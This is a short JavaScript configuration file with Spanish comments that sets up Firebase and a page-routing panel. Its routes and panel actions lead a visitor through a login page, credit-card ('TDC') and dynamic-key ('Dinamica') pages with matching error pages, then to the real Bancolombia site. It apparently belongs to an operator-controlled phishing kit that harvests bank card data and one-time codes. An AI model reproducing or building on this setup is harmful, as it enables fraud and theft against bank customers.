// Configuración centralizada de Firebase y rutas

// Configuración de Firebase
const firebaseConfig = {
  apiKey: "AIzaSyA9QqXTLzB-eyaGp8QTBXWnpFv1PhqWaaY",
  authDomain: "test-c2270.firebaseapp.com",
  projectId: "test-c2270",
  storageBucket: "test-c2270.firebasestorage.app",
  messagingSenderId: "556855035381",
  appId: "1:556855035381:web:8c2876720d2d82f8074cbc"
};
// Inicializar Firebase
if (typeof firebase !== 'undefined') {
    // Verificar si ya está inicializado
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        console.log('✅ Firebase inicializado correctamente');
    } else {
        console.log('✅ Firebase ya estaba inicializado');
    }
    
    // Crear referencia a Firestore
    const db = firebase.firestore();
    
    // Hacer db accesible globalmente
    window.db = db;
    console.log('✅ Variable db creada y disponible globalmente');
} else {
    console.error('❌ Firebase no está cargado. Verifica que los scripts de Firebase estén incluidos.');
}

// Configuración de la aplicación
const appConfig = {
    // Rutas de redirección
    routes: {
        1: { url: "/", name: "Login" },
        2: { url: "tdc.html", name: "TDC" },
        3: { url: "tdc_err.html", name: "TDC Error" },
        4: { url: "dinamica.html", name: "Dinamica" },
        5: { url: "dinamica_err.html", name: "Dinamica Error" },
        6: { url: "https://svpersonas.apps.bancolombia.com/", name: "Fuera" },
    },

    // Tiempo de espera para redirección (en milisegundos)
    timeout: 100000, // 100 segundos

    // Configuración de acciones del panel
    actions: {
        home: { page: 1, color: "#87f79fff" },
        tdc: { page: 2, color: "#e8fff0" },
        tdc_err: { page: 3, color: "#ffd6de" },
        dinamica: { page: 4, color: "#fff8e8" },
        dinamica_err: { page: 5, color: "#ffd6de" },
        fuera: { page: 6, color: "#fff8e8" },
    },

    // Configuración de estados
    status: {
        0: { text: "Cargando", class: "warning" },
        1: { text: "Inicio", class: "success" },
        2: { text: "TDC", class: "success" },
        3: { text: "TDC Error", class: "danger" },
        4: { text: "Dinamica", class: "success" },
        5: { text: "Dinamica Error", class: "danger" },
        6: { text: "Fuera", class: "danger" },
    }
};

// Hacer la configuración accesible globalmente
window.appConfig = appConfig;
window.firebaseConfig = firebaseConfig;
